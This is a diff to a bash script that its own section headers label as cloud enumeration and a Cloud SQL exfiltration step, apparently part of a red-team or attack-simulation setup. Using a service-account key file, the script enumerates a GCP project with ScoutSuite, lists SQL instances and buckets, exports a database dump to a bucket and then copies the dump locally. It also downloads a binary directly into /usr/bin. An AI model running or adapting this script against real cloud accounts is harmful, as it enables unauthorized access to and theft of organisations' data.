@@ -11,7 +11,9 @@ for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null ||
 mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
 
 log "Downloading jq..."
+if ! command -v jq; then
 curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq
+fi
 
 log "public ip: $(curl -s https://icanhazip.com)"
 
@@ -19,23 +21,33 @@ log "public ip: $(curl -s https://icanhazip.com)"
 # gcp cred setup
 #######################
 
-
 export GOOGLE_APPLICATION_CREDENTIALS=~/.config/gcloud/credentials.json
-gcloud auth activate-service-account --key-file ~/.config/gcloud/credentials.json
+gcloud auth activate-service-account --key-file ~/.config/gcloud/credentials.json | tee -a $LOGFILE
+PROJECT=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $2 }' | sed 's/.iam.gserviceaccount.com//g')
+USER=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $1 }')
+DEPLOYMENT=$(echo ${USER##*-})
+cat <<EOF >> $LOGFILE
+PROJECT=$PROJECT
+USER=$USER
+DEPLOYMENT=$DEPLOYMENT
+EOF
 
 #######################
 # cloud enumeration
 #######################
-scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /$SCRIPTNAME/scout-report --all-projects --no-browser 2>&1 | tee -a $LOGFILE 
 
+scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /$SCRIPTNAME/scout-report --project-id=$PROJECT --no-browser 2>&1 | tee -a $LOGFILE 
 
 #######################
 # cloudsql exfil snapshot and export
 #######################
 
-gcloud sql instances list
-# gcloud storage ls
-# gcloud sql instances describe
-# gcloud sql export sql INSTANCE_NAME gs://BUCKET_NAME/sqldumpfile.gz \
-# --database=DATABASE_NAME \
-# --offload
+SQL_INSTANCES=$(gcloud sql instances list --project=$PROJECT --format="json")
+BUCKETS=$(gcloud storage buckets list --project=$PROJECT --format="json")
+SQL_INSTANCE=$(echo $SQL_INSTANCES | jq -r --arg i $DEPLOYMENT '.[] | select(.name | endswith($i)) | .name')
+BUCKET_URL=$(echo $BUCKETS | jq -r --arg i $DEPLOYMENT '.[] | select(.name | contains($i)) | .storage_url')
+gcloud sql instances describe $SQL_INSTANCE --project=$PROJECT 2>&1 | tee -a $LOGFILE 
+gcloud storage bucket list $BUCKET_URL --project=$PROJECT 2>&1 | tee -a $LOGFILE 
+gsutil ls -l $BUCKET_URL 2>&1 | tee -a $LOGFILE 
+gcloud sql export sql --project=$PROJECT $SQL_INSTANCE "${BUCKET_URL}${SQL_INSTANCE}_dump.gz" 2>&1 | tee -a $LOGFILE 
+gsutil cp ${BUCKET_URL}${SQL_INSTANCE}_dump.gz /$SCRIPTNAME 2>&1 | tee -a $LOGFILE 
